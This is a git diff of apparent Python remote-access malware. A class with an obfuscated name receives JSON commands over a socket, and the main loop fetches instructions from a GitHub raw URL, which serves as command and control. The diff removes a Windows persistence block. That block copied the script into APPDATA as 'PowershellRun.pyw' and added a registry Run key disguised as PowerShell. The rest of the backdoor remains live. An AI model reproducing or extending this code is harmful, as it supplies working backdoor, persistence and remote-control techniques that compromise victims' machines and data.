@@ -1,4 +1,4 @@
-import subprocess, socket, json, os, base64, time, urllib.request, shutil, sys
+import subprocess, socket, json, os, base64, time, urllib.request,sys
 
 class dtf2un:
     
@@ -14,7 +14,7 @@ class dtf2un:
         data = "".encode()
         while True:
             try:
-                data = data + self.sp.recv(1024)
+                data = data + self.sp.recv(4096)
                 return json.loads(data)
             except ValueError:
                 continue
@@ -75,11 +75,7 @@ class dtf2un:
             else:
                 self._374egv("Enter a command")
         self.sp.close()
-if sys.platform == "win32":        
-    loc = os.environ["appdata"] + "\\PowershellRun.pyw"
-    if not os.path.exists(loc):
-        shutil.copy(os.path.realpath(__file__),loc)
-        subprocess.call(f'REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V "PowerShellRun" /t REG_SZ /F /D "{loc}"')
+
 while True:
     try:
         data = json.loads(urllib.request.urlopen("https://github.com/cipher234/powershell/raw/main/viper/requestContent").read())
